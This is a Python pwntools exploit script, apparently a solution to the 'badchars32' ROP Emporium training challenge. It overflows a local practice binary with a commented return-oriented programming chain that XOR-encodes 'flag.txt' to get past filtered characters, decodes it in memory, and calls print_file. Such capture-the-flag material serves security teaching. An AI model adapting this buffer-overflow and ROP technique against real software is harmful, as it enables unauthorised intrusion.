from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./badchars32', checksec=False)
p = process()

# How many bytes to EIP?
offset = 44

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section (size=8 bytes)
data_section_address = elf.symbols.data_start
info("%#x data_section_address", data_section_address)
# We will pop string(flag.txt) into esi
# Then pop address of .data section into edi
pop_esi_pop_edi_pop_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
info("%#x pop esi; pop edi; pop ebp; ret;", pop_esi_pop_edi_pop_ebp)
# We will then move the string from esi (flag.txt) into memory location stored in edi
mov_edi_esi = elf.symbols.usefulGadgets + 12  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all
info("%#x mov dword ptr[edi], ebp; ret", mov_edi_esi)

# Pop .data memory location ebp
pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]  # pop ebp; ret;
info("%#x pop_ebp", pop_ebp)
# Pop xor value into ebx (bl is here)
pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]  # pop ebx; ret;
info("%#x pop_ebx", pop_ebx)
# XOR value pointed to by ebp with bl
xor_ebp_bl = elf.symbols.usefulGadgets + 4  # xor byte ptr [ebp], bl; ret;
info("%#x xor_ebp_bl", xor_ebp_bl)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

# Write first 4 bytes (flag) to data section
rop.raw([pop_esi_pop_edi_pop_ebp, xored_string[:4], data_section_address, 0x0, mov_edi_esi])
# Write second 4 bytes (.txt) to data (+ 4 bytes)
rop.raw([pop_esi_pop_edi_pop_ebp, xored_string[4:], data_section_address + 0x4, 0x0, mov_edi_esi])

xor_xploit = b""
data_addr_offset = 0
# The output of this will be used to XOR back to 'flag.txt' after it's been written to .data
for c in xored_string:
    xor_xploit += pack(pop_ebp)  # Pop the next param into ebp
    xor_xploit += pack(data_section_address + data_addr_offset)  # Address of .data section with offset to current char
    xor_xploit += pack(pop_ebx)  # Pop the next param into ebx (bl is part of ebx)
    xor_xploit += pack(value_to_xor_with)  # Value to XOR with ('2' in our case)
    xor_xploit += pack(xor_ebp_bl)  # XOR the value in memory address pointed to by ebp with the value in bl (ebx)
    data_addr_offset += 1  # Add an extra byte to offset each loop until we've covered all chars

# XOR the flag in .data section
rop.raw(xor_xploit)

# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop_chain
})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
